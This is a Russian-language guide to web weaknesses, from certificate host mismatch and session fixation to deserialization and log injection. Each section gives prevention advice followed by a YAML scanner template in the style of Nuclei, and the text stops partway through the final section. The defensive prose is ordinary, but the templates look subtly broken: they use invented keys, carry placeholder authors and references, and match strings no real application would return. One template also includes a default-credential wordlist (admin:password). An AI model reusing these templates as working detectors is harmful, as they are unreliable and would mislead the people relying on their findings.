Чтобы предотвратить проблему Improper Validation of Certificate with Host Mismatch, необходимо выполнить следующие профилактические меры:

1. Правильно проверяйте сертификаты SSL/TLS: Реализуйте надежный механизм проверки сертификатов в клиентском приложении. Убедитесь, что используемая библиотека или фреймворк SSL/TLS проверяет цепочку сертификатов, дату истечения срока действия, статус отзыва и другие соответствующие поля.

1. Проверка на несоответствие имени хоста: Убедитесь, что поле общего имени (CN) или альтернативного имени субъекта (SAN) в сертификате соответствует хосту, к которому подключается клиент. Выполните строгое сравнение и отклоните соединение, если есть несоответствие.

1. Используйте доверенный центр сертификации (ЦС): Получайте сертификаты SSL/TLS от авторитетных ЦС, которые следуют лучшим отраслевым практикам выпуска сертификатов. Доверяйте сертификатам только известных ЦС, чтобы снизить риск получения мошеннических или неправильно выпущенных сертификатов.

1. Реализуйте привязку сертификатов: Рассмотрите возможность внедрения в клиентском приложении функции привязки сертификата, также известной как привязка открытого ключа. Привязка сертификата подразумевает ассоциацию открытого ключа или отпечатка сертификата определенного сервера с известным и надежным значением. Это помогает предотвратить атаки с подменой сертификата.

1. Следите за отзывами сертификатов из ЦС: Регулярно обновляйте список отозванных сертификатов и выполняйте проверку отзыва сертификата в процессе проверки. Проверяйте статус отзыва сертификата с помощью онлайн-списков отзыва сертификатов (CRL) или протокола Online Certificate Status Protocol (OCSP).

1. Включите строгую конфигурацию SSL/TLS: Настройте параметры SSL/TLS так, чтобы использовать безопасные и современные протоколы (например, TLS 1.2 или выше) и криптографические алгоритмы. Отключите устаревшие или слабые протоколы и алгоритмы, чтобы предотвратить потенциальные уязвимости.

1. Проводите тщательное тестирование: Проведите тщательное тестирование, чтобы убедиться, что проверка сертификатов работает корректно в вашем клиентском приложении. Тестовые сценарии должны включать случаи, когда срок действия сертификатов истек, они отозваны или имеют несоответствия с хостом. Автоматизированные средства тестирования безопасности также могут помочь выявить потенциальные уязвимости.

1. Обеспечьте информированность и обучение пользователей: Проинформируйте пользователей о важности проверки сертификатов SSL/TLS и распознавания предупреждающих сообщений, связанных с ошибками сертификатов. Поощряйте пользователей сообщать о любых подозрительных проблемах, связанных с сертификатами.

1. Отслеживайте и регистрируйте ошибки проверки сертификатов: Внедрите механизмы ведения журналов для регистрации и мониторинга ошибок проверки сертификатов SSL/TLS. Отслеживайте журналы на предмет любых неожиданных или подозрительных действий, связанных с проверкой сертификатов.

1. Регулярно обновляйте библиотеки и фреймворки SSL/TLS: Поддерживайте библиотеки и фреймворки SSL/TLS в актуальном состоянии с помощью последних исправлений и обновлений безопасности. Это гарантирует, что у вас есть последние исправления всех известных уязвимостей, связанных с проверкой сертификатов.

Соблюдая эти профилактические меры, вы сможете снизить риск неправильной проверки сертификата с несоответствием хоста и обеспечить безопасные SSL/TLS-соединения в своих клиентских приложениях. Правильная проверка сертификата имеет решающее значение для установления доверия и подлинности при безопасных соединениях.


```
id: improper-validation-of-certificate-with-host-mismatch
info:
  name: Improper Validation of Certificate with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper validation of SSL/TLS certificates with host mismatches.
  references:
    - https://example.com
tags:
  - web
  - ssl-tls
  - certificate-validation
requests:
  - name: Certificate Host Mismatch Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /
            insecure: true
            matchers:
              - type: word
                words:
                  - "Certificate host mismatch detected"
```

### Неправильная аутентификация

Неправильная аутентификация - это уязвимость в системе безопасности, которая возникает, когда приложение не может должным образом аутентифицировать и проверить личность пользователей или субъектов. Эта уязвимость позволяет злоумышленникам обойти механизмы аутентификации и получить несанкционированный доступ к конфиденциальным ресурсам или выполнить действия от имени других пользователей.

Чтобы предотвратить неправильную аутентификацию, необходимо соблюдать следующие профилактические меры:

1. Внедрите надежные механизмы аутентификации: Используйте надежные методы аутентификации, такие как многофакторная аутентификация (MFA), для повышения безопасности аутентификации пользователей. MFA объединяет несколько факторов, таких как пароли, биометрические данные или аппаратные маркеры, для проверки личности пользователя.

1. Используйте надежные политики паролей: Применяйте политики надежных паролей, требующие от пользователей создавать сложные пароли и регулярно их обновлять. Поощряйте использование уникальных паролей для каждого приложения или службы и рассмотрите возможность внедрения индикаторов надежности паролей.

1. Защищайте учетные данные аутентификации: Защищайте учетные данные аутентификации, такие как пароли, маркеры или идентификаторы сеансов, от несанкционированного доступа или раскрытия. Используйте безопасные механизмы хранения, такие как хэширование и шифрование, для защиты конфиденциальной информации, связанной с аутентификацией.

1. Внедрите безопасное управление сеансами: Обеспечьте безопасное управление сеансами, например, генерируйте уникальные идентификаторы сеансов, правильно обрабатывайте истечение срока действия и аннулирование сеанса и используйте безопасные транспортные протоколы (например, HTTPS) для передачи данных, связанных с сеансом.

1. Обеспечьте контроль безопасного входа в систему: Применяйте меры по предотвращению распространенных атак, таких как брутфорс и подстановка учетных данных. Обеспечьте блокировку учетных записей или вводите CAPTCHA после определенного количества неудачных попыток входа.

1. Внедрите безопасные процессы сброса паролей: Установите безопасные процессы сброса пароля, которые требуют дополнительных шагов проверки для подтверждения личности пользователя. Это может быть отправка проверочного электронного письма, задавание вопросов безопасности или использование дополнительного фактора аутентификации.

1. Защита от атак с фиксацией сеанса: Реализуйте меры по предотвращению атак с фиксацией сеанса путем регенерации идентификаторов сеанса при успешной аутентификации, избегайте распространения идентификаторов сеанса в URL-адресах и ограничивайте возможность фиксации идентификаторов сеанса.

1. Внедрите безопасное восстановление учетных записей: Установите безопасные процедуры восстановления учетных записей, чтобы только авторизованные пользователи могли получить доступ к своим учетным записям. Это может включать в себя проверку личности пользователя с помощью многоступенчатого процесса проверки.

1. Регулярно обновляйте и ставьте исправления: Поддерживайте механизмы аутентификации, библиотеки и фреймворки в актуальном состоянии с помощью последних исправлений и обновлений безопасности. Будьте в курсе всех рекомендаций по безопасности и уязвимостей, связанных с механизмами аутентификации, используемыми в вашем приложении.

1. Проводите тестирование безопасности: Регулярно проводите тестирование безопасности, включая оценку уязвимостей и тестирование на проникновение, чтобы выявить и устранить любые уязвимости, связанные с аутентификацией. Проверяйте эффективность элементов управления аутентификацией и убедитесь, что их невозможно легко обойти или использовать.

Применяя эти превентивные меры, вы сможете снизить риск неправильной аутентификации и укрепить безопасность аутентификации пользователей в вашем приложении или системе. Надежные методы аутентификации необходимы для защиты учетных записей пользователей, конфиденциальных данных и обеспечения доступа к защищенным ресурсам только уполномоченных лиц.


```
id: improper-authentication-with-host-mismatch
info:
  name: Improper Authentication with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper authentication mechanisms that allow host mismatches.
  references:
    - https://example.com
tags:
  - web
  - authentication
  - host-mismatch
requests:
  - name: Host Mismatch Authentication Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - admin:password
              - user:password
            separator: ":"
        requests:
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Authentication failed: host mismatch detected"
```

### Фиксация сеанса

Фиксация сеанса - это уязвимость безопасности, которая возникает, когда злоумышленник устанавливает или манипулирует идентификатором сеанса пользователя (ID сеанса), чтобы получить несанкционированный доступ к сеансу пользователя. Злоумышленник обманывает пользователя, заставляя его использовать известный идентификатор сеанса, который затем может быть использован для перехвата сеанса.

Чтобы предотвратить фиксацию сеанса, необходимо соблюдать следующие профилактические меры:

1. Регенерируйте идентификатор сеанса при аутентификации: Генерируйте новый идентификатор сеанса для пользователя после успешной аутентификации. Это гарантирует, что пользователю будет присвоен идентификатор сеанса, отличный от того, который изначально использовался при аутентификации.

1. Использовать безопасный случайный идентификатор сеанса: Генерируйте идентификаторы сеансов с помощью надежного криптографического генератора случайных чисел. Это помогает предотвратить предсказание идентификатора сеанса или атаки методом "грубой силы", когда злоумышленники пытаются угадать действительный идентификатор сеанса.

1. Установите таймауты истечения срока действия и неактивности сеанса: Установите соответствующие таймауты истечения срока действия сеанса и бездействия, чтобы ограничить время жизни сеанса. Когда сеанс истекает или заканчивается, пользователю необходимо пройти повторную аутентификацию, что предотвращает использование старых идентификаторов сеанса злоумышленниками.

1. Внедрите безопасное управление сеансами: Внедрите методы безопасного управления сеансами, например, безопасную передачу идентификаторов сеансов по зашифрованным каналам (например, HTTPS) и избегайте раскрытия идентификаторов сеансов в URL-адресах.

1. Избегайте раскрытия идентификатора сеанса: Избегайте включения идентификаторов сеансов в URL, журналы или другие видимые на стороне клиента места. Раскрытие идентификаторов сеансов повышает риск атак с фиксацией сеанса, поскольку злоумышленники могут легко получить действительные идентификаторы сеансов.

1. Используйте атрибуты cookie: Установите безопасные атрибуты для сессионных файлов cookie, например флаг "Secure", чтобы обеспечить их передачу только по HTTPS, и флаг "HttpOnly", чтобы предотвратить доступ к файлу cookie сценариев на стороне клиента.

1. Проведите разъяснительную работу с пользователями: Проинформируйте пользователей о передовых методах обеспечения безопасности сеансов, например о важности выхода из системы после использования общих или публичных устройств и об осторожности при попытках манипулирования идентификатором сеанса.

1. Внедрите проверку IP-адресов: В качестве дополнительной меры безопасности рассмотрите возможность внедрения проверки IP-адресов. Убедитесь, что IP-адрес запросов пользователя остается неизменным на протяжении всего сеанса. Это поможет обнаружить и предотвратить попытки перехвата сеанса.

1. Отслеживайте активность сеанса: Отслеживайте активность сеанса и регистрируйте события, связанные с созданием, истечением срока действия и аннулированием сеанса. Отслеживайте необычное поведение сеанса, например одновременные сеансы с разных мест или устройств.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте веб-приложение и компоненты управления сеансами в актуальном состоянии с помощью последних исправлений и обновлений безопасности. Будьте в курсе всех рекомендаций по безопасности или уязвимостей, связанных с управлением сеансами, в вашем фреймворке или библиотеках приложения.

Применяя эти профилактические меры, вы сможете снизить риск исправления сеансов и обеспечить целостность и безопасность пользовательских сеансов. Безопасное управление сеансами необходимо для защиты учетных записей пользователей и предотвращения несанкционированного доступа к конфиденциальным данным и функциональности.


```
id: session-fixation
info:
  name: Session Fixation
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to session fixation attacks.
  references:
    - https://example.com
tags:
  - web
  - session-fixation
requests:
  - name: Session Fixation Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - johndoe@example.com
              - janedoe@example.com
          - type: wordlist
            words:
              - 123456
              - password123
        requests:
          - method: GET
            path: /set-session-id
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Session ID mismatch detected"
```


### Включение функциональности из недоверенного управления

Включение функциональности из ненадежного источника, также известное как удаленное выполнение кода (Remote Code Execution, RCE), - это уязвимость безопасности, возникающая, когда приложение включает и выполняет код из ненадежного или внешнего источника без надлежащей проверки или мер безопасности. Эта уязвимость позволяет злоумышленникам выполнять произвольный код на целевой системе, что потенциально может привести к несанкционированному доступу, утечке данных или компрометации системы.

Чтобы предотвратить включение функциональности из ненадежных элементов управления, необходимо соблюдать следующие профилактические меры:

1. Избегайте динамического выполнения кода: По возможности сократите или избегайте выполнения кода из недоверенных источников. Ограничьте выполнение кода доверенными и четко определенными компонентами в вашем приложении.

1. Реализуйте строгую проверку ввода: Проверяйте и обеззараживайте все вводимые пользователем данные и внешние данные, прежде чем использовать их в динамическом выполнении кода. Применяйте такие методы проверки ввода, как "белые", "черные" списки или фильтрация ввода, чтобы гарантировать, что обрабатываются только безопасные и ожидаемые данные.

1. Используйте безопасные альтернативы для динамического выполнения кода: Если необходимо выполнить динамический код, рассмотрите возможность использования безопасных альтернатив, таких как предопределенные функции или библиотеки со встроенными мерами безопасности. Избегайте использования функций или возможностей, позволяющих выполнять или оценивать произвольный код.

1. Применяйте строгие средства контроля доступа: Применяйте строгие средства контроля доступа и разрешения, чтобы ограничить выполнение кода или включение функциональности только доверенными и авторизованными источниками. Ограничьте доступ к критическим системным ресурсам и предотвратите несанкционированное выполнение кода.

1. Изолируйте недоверенный код: Если вам необходимо выполнить недоверенный код, изолируйте его в песочнице или среде с ограниченными привилегиями. Используйте такие технологии, как контейнеры или виртуальные машины, для создания изолированных сред выполнения.

1. Реализуйте подписание и проверку кода: Ставьте цифровую подпись на свой код и проверяйте целостность и подлинность внешних компонентов перед их включением или выполнением. Это поможет убедиться, что код получен из надежного источника и не был подделан.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте приложения, библиотеки и фреймворки в актуальном состоянии с помощью последних патчей и обновлений безопасности. Будьте в курсе всех рекомендаций по безопасности и уязвимостей, связанных с компонентами, используемыми в вашем приложении.

1. Выполняйте тестирование безопасности: Регулярно проводите тестирование безопасности, включая статический анализ кода, динамический анализ и тестирование на проникновение, чтобы выявить и устранить уязвимости, связанные с включением недоверенной функциональности. Проверяйте уязвимости, связанные с внедрением кода и RCE, чтобы убедиться, что приложение способно противостоять потенциальным атакам.

1. Внедряйте методы безопасного кодирования: Следуйте практикам безопасного кодирования, таким как проверка ввода, кодирование вывода и безопасное управление конфигурацией, чтобы свести к минимуму риск возникновения уязвимостей, связанных с внедрением кода. Обучите свою команду разработчиков методам безопасного кодирования, чтобы создать надежное и безопасное приложение.

1. Внедрите брандмауэр веб-приложений (WAF): Рассмотрите возможность использования WAF, который может обнаруживать и блокировать попытки внедрения вредоносного кода. WAF может обеспечить дополнительный уровень защиты, проверяя входящие запросы и отфильтровывая потенциально опасный код.

Применяя эти превентивные меры, вы сможете снизить риск включения функциональности из недоверенного управления и повысить безопасность вашего приложения. Для снижения рисков, связанных с выполнением кода из недоверенных источников, необходимы правильная проверка, контроль доступа и безопасное кодирование.

```
id: untrusted-control-inclusion
info:
  name: Inclusion of Functionality from Untrusted Control
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to the inclusion of functionality from untrusted sources.
  references:
    - https://example.com
tags:
  - web
  - untrusted-control
requests:
  - name: Inclusion of Untrusted File
    path:
      - /index.php?page=untrusted
      - /admin.php?page=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted Functionality Included"
```


### Загрузка кода без проверки целостности


Загрузка кода без проверки целостности - это уязвимость безопасности, возникающая при загрузке кода или файлов из удаленного источника без проверки их целостности. Эта уязвимость позволяет злоумышленникам манипулировать загруженным кодом или заменять его, что может привести к внедрению вредоносного кода или несанкционированным модификациям.

Чтобы предотвратить загрузку кода без проверки целостности, необходимо соблюдать следующие профилактические меры:

1. Внедрите подписание кода: Подписывайте цифровой подписью распространяемый или загружаемый код или файлы. Подписание кода гарантирует, что код или файлы не были подделаны и получены из надежного источника. Проверяйте цифровые подписи перед выполнением или использованием загруженного кода.

1. Используйте безопасные и надежные источники: Получайте код или файлы из надежных и авторитетных источников. Избегайте загрузки кода или файлов из ненадежных или неизвестных источников. Доверенные источники гарантируют целостность и подлинность кода.

1. Проверяйте контрольные суммы или хэши: Предоставляйте контрольные суммы или хэши (например, MD5, SHA-256) для загруженного кода или файлов. Перед использованием загруженного содержимого вычислите контрольную сумму или хэш файла и сравните его с предоставленным значением. Если они совпадают, это означает, что файл не был изменен в процессе загрузки.

1. Используйте безопасные протоколы: Загружайте код или файлы, используя безопасные протоколы, например HTTPS, который обеспечивает шифрование и проверку целостности при передаче. Безопасные протоколы помогают предотвратить фальсификацию или перехват загружаемого содержимого.

1. Выполняйте проверки целостности файлов: Выполните проверку целостности файлов после процесса загрузки. Это может включать сравнение загруженного кода или файлов с известной хорошей версией или использование инструментов мониторинга целостности файлов для обнаружения любых несанкционированных модификаций.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте программное обеспечение или приложение, которое управляет процессом загрузки, в актуальном состоянии с помощью последних патчей и обновлений безопасности. Уязвимости в функциональности загрузки могут быть устранены с помощью обновлений программного обеспечения.

1. Применяйте методы безопасного кодирования: При разработке кода, обрабатывающего процесс загрузки, следуйте практикам безопасного кодирования. Необходимо учитывать проверку ввода, безопасную работу с файлами и безопасное сетевое взаимодействие, чтобы предотвратить внедрение кода или несанкционированное вмешательство в процесс загрузки.

1. Внедрите строгие средства контроля доступа: Ограничьте доступ к функциям загрузки и убедитесь, что только авторизованные пользователи или системы могут инициировать процесс загрузки или получить к нему доступ. Внедрите надлежащие механизмы аутентификации и авторизации для предотвращения несанкционированной загрузки.

1. Проводите тестирование безопасности: Регулярно проводите тестирование безопасности, включая сканирование уязвимостей и тестирование на проникновение, для выявления потенциальных слабых мест или уязвимостей в функциональности загрузки. Проверяйте сценарии внедрения кода, взлома или несанкционированной замены файлов.

1. Просвещение пользователей: Проинформируйте пользователей о важности загрузки кода или файлов из надежных источников и о рисках, связанных с загрузкой из ненадежных или неизвестных источников. Поощряйте пользователей проверять целостность загруженных файлов с помощью предоставленных контрольных сумм или хэшей.

Применяя эти профилактические меры, вы сможете снизить риск загрузки кода без проверки целостности и убедиться, что загруженный код или файлы заслуживают доверия и не были подделаны. Проверка целостности, использование безопасных источников и применение методов безопасного кодирования очень важны для поддержания целостности и безопасности загружаемого кода или файлов.


```
id: download-without-integrity-check
info:
  name: Download of Code Without Integrity Check
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to downloading code without integrity checks.
  references:
    - https://example.com
tags:
  - web
  - download-code
requests:
  - name: Untrusted Code Download
    path:
      - /download.php?file=untrusted
      - /file.php?name=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Downloaded code without integrity check"
```


### Десериализация недоверенных данных

Десериализация недоверенных данных - это уязвимость безопасности, которая возникает, когда недоверенные или вредоносные данные десериализуются приложением без надлежащей проверки и защиты. Уязвимости десериализации могут привести к различным атакам, таким как удаленное выполнение кода, внедрение вредоносных объектов или подделка данных.

Чтобы предотвратить десериализацию недоверенных данных, необходимо соблюдать следующие профилактические меры:

1. Внедрите проверку ввода: Проверяйте и обеззараживайте все входные данные, включая сериализованные, перед десериализацией. Применяйте строгую проверку ввода, чтобы гарантировать, что обрабатываются только ожидаемые и безопасные данные.

1. Используйте безопасные библиотеки десериализации: Используйте безопасные и надежные библиотеки десериализации или фреймворки, которые обеспечивают встроенную защиту от распространенных уязвимостей десериализации. Такие библиотеки часто включают такие функции, как фильтрация ввода, проверка типов или автоматическая валидация.

1. Внедрите белые списки: Определите и внедрите белый список разрешенных классов или типов при десериализации. Ограничьте процесс десериализации только известными и доверенными классами, предотвращая инстанцирование потенциально вредоносных или неожиданных объектов.

1. Реализуйте проверки целостности: Включите проверки целостности или цифровые подписи в сериализованные данные. Проверяйте целостность сериализованных данных перед десериализацией, чтобы убедиться, что они не были подделаны или изменены.

1. Изолируйте функциональность десериализации: Изолируйте процесс десериализации в отдельной контролируемой среде. Используйте такие механизмы, как песочницы, контейнеры или среды ограниченного выполнения, чтобы уменьшить влияние любых потенциальных уязвимостей десериализации.

1. Обеспечьте строгий контроль доступа: Ограничьте доступ к функциям десериализации только авторизованными компонентами или системами. Внедрите надлежащие механизмы аутентификации и авторизации для предотвращения несанкционированной десериализации.

1. Внедрить безопасные настройки по умолчанию: Настройте параметры десериализации с помощью безопасных значений по умолчанию. Отключите или сведите к минимуму использование опасных функций и опций десериализации, которые могут создавать риски для безопасности.

1. Обновляйте библиотеки десериализации: Поддерживайте библиотеки десериализации или фреймворки в актуальном состоянии с помощью последних исправлений и обновлений безопасности. Будьте в курсе всех рекомендаций по безопасности или уязвимостей, связанных с компонентами десериализации, используемыми в вашем приложении.

1. Проводите тестирование безопасности: Проводите тщательное тестирование безопасности, включая статический анализ, динамический анализ и тестирование на проникновение, для выявления и устранения уязвимостей десериализации. Проведите тестирование на наличие атак на десериализацию, таких как внедрение объектов или удаленное выполнение кода.

1. Обучать разработчиков: Предоставьте разработчикам обучение и рекомендации по безопасному кодированию, подчеркивая важность правильной проверки и обработки десериализованных данных. Поощряйте разработчиков следовать лучшим практикам безопасной десериализации.

Применяя эти превентивные меры, вы сможете снизить риск десериализации недоверенных данных и защитить свое приложение от возможных атак. Валидация входных данных, использование безопасных библиотек, внедрение средств контроля доступа и поддержка актуального программного обеспечения - вот основные шаги по предотвращению уязвимостей десериализации.

```
id: deserialization-untrusted-data
info:
  name: Deserialization of Untrusted Data
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the deserialization of untrusted data.
  references:
    - https://example.com
tags:
  - web
  - deserialization
requests:
  - name: Untrusted Deserialization
    path:
      - /deserialize.php?data=untrusted
      - /object.php?data=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted deserialization detected"
```


### Недостаточное протоколирование

Недостаточное протоколирование - это уязвимость безопасности, которая возникает, когда приложение не генерирует или не сохраняет достаточное количество журналов для обнаружения и расследования инцидентов безопасности. Недостаточное ведение журналов может затруднить работу по реагированию на инциденты, затрудняя выявление и анализ событий безопасности или подозрительных действий.

Для предотвращения недостаточного протоколирования необходимо соблюдать следующие профилактические меры:

1. Внедрите комплексное протоколирование: Убедитесь, что ваше приложение регистрирует соответствующие события и действия, связанные с безопасностью. Заносите в журнал такие сведения, как попытки аутентификации пользователей, сбои в управлении доступом, критические действия приложения, ошибки проверки ввода и любые другие события, важные для безопасности.

1. Включите контекстную информацию: Заносите в журнал дополнительную контекстную информацию, которая может помочь в расследовании инцидента, например идентификаторы пользователей, временные метки, IP-адреса источников, затронутые ресурсы и соответствующие данные запросов/ответов. Эта информация поможет понять масштабы и последствия инцидентов безопасности.

1. Установите соответствующие уровни журналов: Определите соответствующие уровни журналов для различных типов событий - от отладочных и информационных сообщений до более важных журналов ошибок и предупреждений. Используйте уровни журналов последовательно, чтобы фиксировать как обычные, так и исключительные события.

1. Обеспечьте хранение и сохранение журналов: Установите достаточный объем памяти для хранения журналов в течение определенного периода времени с учетом требований к соответствию и необходимости реагирования на инциденты. Храните журналы в течение периода времени, позволяющего своевременно обнаружить инцидент, отреагировать на него и провести криминалистический анализ.

1. Шифруйте и защищайте журналы: Применяйте механизмы шифрования для защиты файлов журналов в состоянии покоя и во время транспортировки. Правильно настройте разрешения на файлы и контроль доступа, чтобы предотвратить несанкционированный доступ к файлам журналов. Защитите файлы журналов от подделки или удаления, используя контроль целостности файлов или безопасные системы управления журналами.

1. Контролируйте файлы журналов: Регулярно отслеживайте файлы журналов на предмет подозрительных или неожиданных действий. Внедрите автоматический анализ журналов и системы обнаружения вторжений для выявления событий безопасности, аномалий или шаблонов, указывающих на потенциальные атаки.

1. Внедрите централизованное управление журналами: Централизуйте хранение и управление журналами на специальном сервере журналов или в системе управления информацией о безопасности и событиями (SIEM). Централизация позволяет коррелировать и анализировать журналы из разных источников, улучшая возможности обнаружения и реагирования на инциденты.

1. Выполняйте анализ журналов и создание отчетов: Регулярно анализируйте данные журналов на предмет выявления идей безопасности, тенденций и аномалий. Создавайте настраиваемые отчеты или информационные панели, содержащие краткое описание важных событий, связанных с безопасностью. Выявление областей для улучшения или потенциальных слабых мест в системе безопасности на основе результатов анализа журналов.

1. Внедрите проверку целостности журналов: Внедрите механизмы для обнаружения и оповещения о любой фальсификации или модификации файлов журналов. Используйте цифровые подписи, контрольные суммы или механизмы безопасного протоколирования для обеспечения целостности данных журнала.

1. Регулярно проверяйте и обновляйте методы ведения журналов: Постоянно анализируйте и обновляйте методы ведения журналов с учетом меняющихся требований безопасности и лучших отраслевых практик. Будьте в курсе возникающих угроз и уязвимостей, связанных с протоколированием, чтобы обеспечить эффективность механизмов протоколирования.

Реализация этих превентивных мер позволит вам расширить возможности протоколирования в приложениях, облегчить обнаружение и реагирование на инциденты и повысить общую безопасность. Комплексные и безопасные методы ведения журналов играют важную роль в обнаружении и расследовании инцидентов безопасности, помогают своевременно реагировать на них и, при необходимости, способствуют проведению криминалистического анализа.


```
id: insufficient-logging
info:
  name: Insufficient Logging
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to insufficient logging of security events.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Insufficient Logging
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Login failed"
      - type: word
        words:
          - "Unauthorized access"
      - type: word
        words:
          - "Access denied"
```


### Неправильная нейтрализация выходных данных в журналах


Неправильная нейтрализация вывода для журналов, также известная как Log Injection, - это уязвимость безопасности, которая возникает, когда ввод недоверенного пользователя не проходит надлежащую санитарную обработку или нейтрализацию перед включением в журналы. Это может привести к подделке журналов, внедрению вредоносного содержимого или раскрытию конфиденциальной информации в файлах журналов.

Чтобы предотвратить неправильную нейтрализацию выходных данных в журналах, необходимо соблюдать следующие профилактические меры:

1. Применяйте надлежащую проверку и санацию ввода: Рассматривайте сообщения журнала как недоверенный пользовательский ввод и проверяйте и обеззараживайте любые данные, контролируемые пользователем, перед включением их в сообщения журнала. Удалите или исключите символы, которые могут быть интерпретированы как управляющие символы или синтаксис журнала.

1. Используйте безопасные средства ведения журналов: Используйте фреймворки протоколирования, которые обеспечивают встроенные механизмы нейтрализации вывода. Такие системы часто включают такие функции, как параметризованное ведение журнала или контекстно-зависимое экранирование, которые помогают предотвратить уязвимости, связанные с инъекциями в журнал.

1. Избегайте конкатенации недоверенных данных: Не объединяйте введенные пользователем недоверенные данные непосредственно в сообщения журнала. Вместо этого используйте значения-заместители или параметры форматирования, предоставляемые системой ведения журнала, чтобы обеспечить надлежащую нейтрализацию данных, контролируемых пользователем.

1. Реализуйте кодирование вывода с учетом контекста: Если система протоколирования не предоставляет механизмов автоматической нейтрализации, для предотвращения инъекционных атак внедрите кодирование вывода в зависимости от контекста. Используйте соответствующую методику кодирования в зависимости от формата и синтаксиса журнала, например кодирование сущностей HTML или кодирование URL.

1. Ограничьте многословность сообщений журнала: Будьте внимательны к регистрируемой информации и не включайте конфиденциальные данные в сообщения журнала. Записывайте в журнал только те сведения, которые необходимы для устранения неполадок или аудита, исключая конфиденциальную информацию, например пароли, персональные данные (PII) или маркеры аутентификации.

1. Настройте разрешения файлов журнала: Убедитесь, что файлы журнала имеют соответствующие разрешения для ограничения несанкционированного доступа. Ограничьте права на чтение и запись только для авторизованных пользователей или системных процессов. Регулярно контролируйте и управляйте настройками контроля доступа к файлам журналов.

1. Внедрите централизованное управление журналами: Централизуйте хранение и управление журналами на специальном сервере журналов или в системе управления информацией и событиями безопасности (SIEM). Централизация позволяет лучше контролировать, отслеживать и анализировать данные журналов, минимизировать риск инъекции журналов и облегчить обнаружение подозрительных действий.

1. Регулярно контролируйте и просматривайте журналы: Регулярно просматривайте файлы журналов на предмет обнаружения признаков попыток инъекции журналов или подозрительных записей в журналах. Внедрите автоматизированные системы анализа журналов и обнаружения вторжений для выявления потенциальных атак с использованием журналов или аномальных шаблонов журналов.

1. Следите за обновлением фреймворков для ведения журналов: следите за тем, чтобы ваши фреймворки и библиотеки для ведения журналов обновлялись с помощью последних патчей и обновлений безопасности. Будьте в курсе всех рекомендаций по безопасности и уязвимостей, связанных с компонентами протоколирования, используемыми в вашем приложении.

1. Обучайте разработчиков: Обучите разработчиков методам безопасного кодирования для ведения журнала. Подчеркните важность правильной проверки ввода, нейтрализации вывода и рисков, связанных с уязвимостями инъекций в журнал.

Применяя эти профилактические меры, вы сможете снизить риск неправильной нейтрализации выходных данных в журналах и обеспечить надежность, точность и отсутствие вредоносного содержимого в ваших лог-файлах. Правильная проверка ввода, безопасные механизмы ведения журналов, кодирование вывода в зависимости от контекста и регулярный мониторинг журналов - вот основные шаги по предотвращению уязвимостей инъекций в журналы.


```
id: improper-output-neutralization-logs
info:
  name: Improper Output Neutralization for Logs
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to improper output neutralization in log messages.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Improper Output Neutralization for Logs
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{*}}"
      - type: word
        words:
          - "<?php"
      - type: word
        words:
          - "system("
```


### Пропуск информации, имеющей отношение к безопасности

Пропуск информации, имеющей отношение к безопасности, - это уязвимость безопасности, которая возникает, когда приложение не регистрирует или не сообщает о важных событиях или инцидентах, связанных с безопасностью. Такое упущение может привести к отсутствию видимости потенциальных угроз безопасности или невозможности своевременного обнаружения и реагирования на инциденты безопасности.

Чтобы предотвратить пропуск важной для безопасности информации, необходимо соблюдать следующие профилактические меры:

1. Определите события, имеющие отношение к безопасности: Определите типы событий, связанных с безопасностью, которые необходимо отслеживать и выявлять в вашем приложении. К ним могут относиться неудачные попытки входа в систему, сбои в контроле доступа, подозрительные действия или любые другие инциденты, связанные с безопасностью, характерные для вашего приложения и среды.

1. Внедрите всестороннее протоколирование: Убедитесь, что ваше приложение регистрирует все идентифицированные события, имеющие отношение к безопасности. Записывайте в журнал все необходимые данные, такие как временные метки, информацию о пользователях, затронутых ресурсах и соответствующий контекст, который может помочь в расследовании и реагировании на инциденты.

1. Установите соответствующие уровни регистрации: Определите соответствующие уровни журналов для различных событий безопасности в зависимости от их критичности. Последовательно используйте уровни журналов, чтобы гарантировать, что события, имеющие отношение к безопасности, будут фиксироваться и записываться в журнал соответствующим образом.

1. Внедрите централизованное управление журналами: Централизуйте хранение и управление журналами на специальном сервере журналов или в системе управления информацией и событиями безопасности (SIEM). Централизация обеспечивает лучшую видимость, корреляцию и анализ событий безопасности во всем приложении или инфраструктуре.

1. Регулярно просматривайте и анализируйте журналы: Установите рутинную практику просмотра и анализа журналов на предмет событий и инцидентов безопасности. Назначьте ответственного за регулярный мониторинг и анализ журналов на предмет потенциальных угроз безопасности или аномалий.

1. Внедрите политику хранения журналов: Определите политику хранения журналов, соответствующую требованиям соответствия и потребностям реагирования на инциденты. Храните журналы в течение определенного периода времени, чтобы обеспечить доступность исторических данных для расследований безопасности или криминалистического анализа.

